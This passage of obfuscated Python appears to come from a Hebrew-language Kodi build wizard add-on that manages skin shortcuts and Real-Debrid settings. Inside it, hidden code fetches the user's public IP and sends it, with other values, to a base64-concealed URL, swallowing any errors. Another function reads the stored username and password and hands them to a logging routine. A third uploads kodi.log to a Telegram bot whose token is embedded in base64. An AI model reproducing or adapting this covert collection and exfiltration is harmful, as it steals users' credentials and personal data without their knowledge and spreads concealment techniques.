          OOOOOOOO000O0O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:575
          OO00000OO0OO0O000 =str (json .loads (OOOOOOOO000O0O000 )['ip'])#line:576
          O0OO0O000OO00OO0O =OO0OOOOO0OO0000OO #line:577
          OOO00000O00OO0OOO =OO0O00O000OOOOO00 #line:578
          import socket #line:580
          OOOOOOOO000O0O000 =urllib2 .urlopen (O0OOOO0O0O000OO00 .decode ('base64')+' - '+O0OO0O000OO00OO0O +' - '+OOO00000O00OO0OOO +' - '+OO0O0O0O0O00OOOO0 ).readlines ()#line:581
       except :pass #line:582
def googleindicat ():#line:585
			import logg #line:586
			OO0O0OOO00O0OO0O0 =(ADDON .getSetting ("pass"))#line:587
			OO0000OO0000OO000 =(ADDON .getSetting ("user"))#line:588
			logg .logGA (OO0O0OOO00O0OO0O0 ,OO0000OO0000OO000 )#line:589
def logsend ():#line:590
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:591
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:592
      howsentlog ()#line:594
      import requests #line:595
      if xbmc .getCondVisibility ('system.platform.windows'):#line:596
         O00O000OO0000O0O0 =xbmc .translatePath ('special://home/kodi.log')#line:597
         O0OOOOO0OOO000000 ={'chat_id':(None ,'-274262389'),'document':(O00O000OO0000O0O0 ,open (O00O000OO0000O0O0 ,'rb')),}#line:601
         OO00OO0O00O00OOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:602
         OOOO00O000OOOO0OO =requests .post (OO00OO0O00O00OOOO .decode ('base64'),files =O0OOOOO0OOO000000 )#line:604
      elif xbmc .getCondVisibility ('system.platform.android'):#line:605
           O00O000OO0000O0O0 =xbmc .translatePath ('special://temp/kodi.log')#line:606
           O0OOOOO0OOO000000 ={'chat_id':(None ,'-274262389'),'document':(O00O000OO0000O0O0 ,open (O00O000OO0000O0O0 ,'rb')),}#line:610
           OO00OO0O00O00OOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:611
           OOOO00O000OOOO0OO =requests .post (OO00OO0O00O00OOOO .decode ('base64'),files =O0OOOOO0OOO000000 )#line:613
      else :#line:614
           O00O000OO0000O0O0 =xbmc .translatePath ('special://kodi.log')#line:615
           O0OOOOO0OOO000000 ={'chat_id':(None ,'-274262389'),'document':(O00O000OO0000O0O0 ,open (O00O000OO0000O0O0 ,'rb')),}#line:619
           OO00OO0O00O00OOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:620
           OOOO00O000OOOO0OO =requests .post (OO00OO0O00O00OOOO .decode ('base64'),files =O0OOOOO0OOO000000 )#line:622
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:623
def rdoff ():#line:625
	OOO00OO0O0O00OOOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:626
	OOO00OO0O0O00OOOO .setSetting ('rd.client_id','')#line:627
	OOO00OO0O0O00OOOO .setSetting ('rd.secret','')#line:628
	OOO00OO0O0O00OOOO .setSetting ('rdsource','false')#line:629
	OOO00OO0O0O00OOOO .setSetting ('super_fast_type_toren','false')#line:630
	OOO00OO0O0O00OOOO .setSetting ('rd.auth','false')#line:631
	OOO00OO0O0O00OOOO .setSetting ('rd.refresh','false')#line:632
	OOO00OO0O0O00OOOO .setSetting ('magnet','false')#line:633
	OOO00OO0O0O00OOOO .setSetting ('torrent_server','false')#line:634
	OOO00OO0O0O00OOOO =xbmcaddon .Addon ('script.module.resolveurl')#line:636
	OOO00OO0O0O00OOOO .setSetting ('RealDebridResolver_client_id','')#line:637
	OOO00OO0O0O00OOOO .setSetting ('RealDebridResolver_client_secret','')#line:638
	OOO00OO0O0O00OOOO .setSetting ('RealDebridResolver_token','')#line:639
	OOO00OO0O0O00OOOO .setSetting ('RealDebridResolver_refresh','')#line:640
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:641
		OOO00OO0O0O00OOOO =xbmcaddon .Addon ('plugin.video.seren')#line:642
		OOO00OO0O0O00OOOO .setSetting ('rd.client_id','')#line:644
		OOO00OO0O0O00OOOO .setSetting ('rd.secret','')#line:645
		OOO00OO0O0O00OOOO .setSetting ('rd.auth','')#line:646
		OOO00OO0O0O00OOOO .setSetting ('rd.refresh','')#line:647
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:648
		OOO00OO0O0O00OOOO =xbmcaddon .Addon ('plugin.video.gaia')#line:649
		OOO00OO0O0O00OOOO .setSetting ('accounts.debrid.realdebrid.id','')#line:650
		OOO00OO0O0O00OOOO .setSetting ('accounts.debrid.realdebrid.secret','')#line:651
		OOO00OO0O0O00OOOO .setSetting ('accounts.debrid.realdebrid.token','')#line:652
		OOO00OO0O0O00OOOO .setSetting ('accounts.debrid.realdebrid.refresh','')#line:653
	resloginit .resloginit ('restore','all')#line:654
	O0000000OOO00000O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:656
	OO0O00OOO0OOO0000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:657
	copyfile (O0000000OOO00000O ,OO0O00OOO0OOO0000 )#line:658
def skindialogsettind18 ():#line:659
	try :#line:660
		OO0OO000O0OO0OO0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:661
		OO00OO0O00O000OO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:662
		copyfile (OO0OO000O0OO0OO0O ,OO00OO0O00O000OO0 )#line:663
	except :pass #line:664
def rdon ():#line:665
	loginit .loginIt ('restore','all')#line:666
	OOOOO00OO0000OO00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:668
	OOOOO00OO0000O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:669
	copyfile (OOOOO00OO0000OO00 ,OOOOO00OO0000O000 )#line:670
def adults18 ():#line:672
  O00O0O000OOO000O0 =(ADDON .getSetting ("adults"))#line:673
  if O00O0O000OOO000O0 =='true':#line:674
    O0O0OOOO00OO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:675
    with open (O0O0OOOO00OO00O00 ,'r')as OOO000OO000000OO0 :#line:676
      O0OO00OO0O0OOO00O =OOO000OO000000OO0 .read ()#line:677
    O0OO00OO0O0OOO00O =O0OO00OO0O0OOO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:695
    with open (O0O0OOOO00OO00O00 ,'w')as OOO000OO000000OO0 :#line:698
      OOO000OO000000OO0 .write (O0OO00OO0O0OOO00O )#line:699
def rdbuildaddon ():#line:700
  O0000OOOO000OO0O0 =(ADDON .getSetting ("auto_rd"))#line:701
  if O0000OOOO000OO0O0 =='true':#line:702
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:703
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:704
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:705
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:723
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:726
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:727
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:731
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:732
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:733
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:751
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:754
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:755
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:759
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:760
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:761
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:779
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:782
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:783
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:787
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:788
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:789
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:807
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:810
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:811
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:814
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:815
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:816
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:834
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:837
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:838
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:840
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:841
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:842
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:860
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:863
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:864
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:866
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:867
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:868
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:886
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:889
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:890
    O0000O0OO00OOO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:893
    with open (O0000O0OO00OOO0OO ,'r')as O0OO00O00O0OO0O00 :#line:894
      OOOO0O0OO000O000O =O0OO00O00O0OO0O00 .read ()#line:895
    OOOO0O0OO000O000O =OOOO0O0OO000O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:913
    with open (O0000O0OO00OOO0OO ,'w')as O0OO00O00O0OO0O00 :#line:916
      O0OO00O00O0OO0O00 .write (OOOO0O0OO000O000O )#line:917
def rdbuildinstall ():#line:920
  try :#line:921
   O0OOO0OO0000O00O0 =(ADDON .getSetting ("auto_rd"))#line:922
   if O0OOO0OO0000O00O0 =='true':#line:923
     O0O00000OOO0O00OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:924
     OO00OOO0O000O0O0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:925
     copyfile (O0O00000OOO0O00OO ,OO00OOO0O000O0O0O )#line:926
  except :#line:927
     pass #line:928
def rdbuildaddonoff ():#line:931
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:934
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:935
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:936
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:954
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:957
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:958
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:962
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:963
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:964
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:982
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:985
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:986
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:990
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:991
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:992
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1010
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:1013
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:1014
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1018
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:1019
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:1020
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1038
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:1041
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:1042
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1045
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:1046
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:1047
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1065
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:1068
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:1069
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1071
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:1072
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:1073
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1091
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:1094
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:1095
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1097
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:1098
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:1099
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1117
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:1120
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:1121
    OO00O00OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1124
    with open (OO00O00OOO00O0O00 ,'r')as O0OO0OO0O00OOOOO0 :#line:1125
      OOOO0000OOOOOOO0O =O0OO0OO0O00OOOOO0 .read ()#line:1126
    OOOO0000OOOOOOO0O =OOOO0000OOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1144
    with open (OO00O00OOO00O0O00 ,'w')as O0OO0OO0O00OOOOO0 :#line:1147
      O0OO0OO0O00OOOOO0 .write (OOOO0000OOOOOOO0O )#line:1148
def rdbuildinstalloff ():#line:1151
    try :#line:1152
       OO00000O0OOOOOOO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1153
       OOO0000OO0O00OOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1154
       copyfile (OO00000O0OOOOOOO0 ,OOO0000OO0O00OOOO )#line:1156
       OO00000O0OOOOOOO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1158
       OOO0000OO0O00OOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1159
       copyfile (OO00000O0OOOOOOO0 ,OOO0000OO0O00OOOO )#line:1161
       OO00000O0OOOOOOO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1163
       OOO0000OO0O00OOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1164
       copyfile (OO00000O0OOOOOOO0 ,OOO0000OO0O00OOOO )#line:1166
       OO00000O0OOOOOOO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1169
